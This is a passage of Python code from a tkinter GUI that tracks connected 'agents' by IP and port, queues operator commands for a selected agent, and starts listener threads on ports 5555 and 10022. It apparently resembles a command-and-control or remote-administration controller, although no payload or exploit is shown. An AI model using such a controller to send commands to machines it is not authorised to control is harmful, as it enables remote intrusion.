                            print(f"Removed agent {ip[0]}:{ip[1]} from agent_pool")
                            break
                    print(f"IP {ip[0]}:{ip[1]} deleted from list.")
                    break
        else:
            contains = False
            for index, item in enumerate(items):
                if f"{ip[0]}:{ip[1]}" in item:
                    contains = True
                    break

            if not contains:
                connected_ips_listbox.insert(tk.END, ip_text)
                print(f"IP {ip[0]}:{ip[1]} added to the list.")
    except Exception as e:
        print(f"Error removing IP, maybe it doesn't exist: {e}")


def perform_action(pending_customers, command, button_name):
    global current_output_tab, output_tabs
    sys.stdout = output_capture
    try:
        selected_item = connected_ips_listbox.get(connected_ips_listbox.curselection())
        if selected_item:
            # Extract the IP and port from the selected item
            rest, selected_ip, selected_port = selected_item.split(':')
            selected_port = int(selected_port.split(' -')[0])
            # Perform the desired action for the selected IP and port
            print(f"Performing action: {command} for IP: {selected_ip.strip()}, Port: {selected_port}")
            agent = (selected_ip.strip(), selected_port)
            current_output_tab = button_name
            pending_customers.put((agent, selected_ip.strip(), command))
    except tk.TclError:
        print("No item selected in the listbox.")


if __name__ == "__main__":
    master_addr = ('0.0.0.0', 5555)
    customer_addr = ('0.0.0.0', 10022)

    # Create the pending_customers queue
    pending_customers = queue.Queue()

    # Thread for running the master
    master_thread = threading.Thread(target=run_master, args=(master_addr, customer_addr, pending_customers))
    master_thread.start()

    # Thread for running the GUI
    gui_thread = threading.Thread(target=create_gui, args=(pending_customers,))
    gui_thread.start()

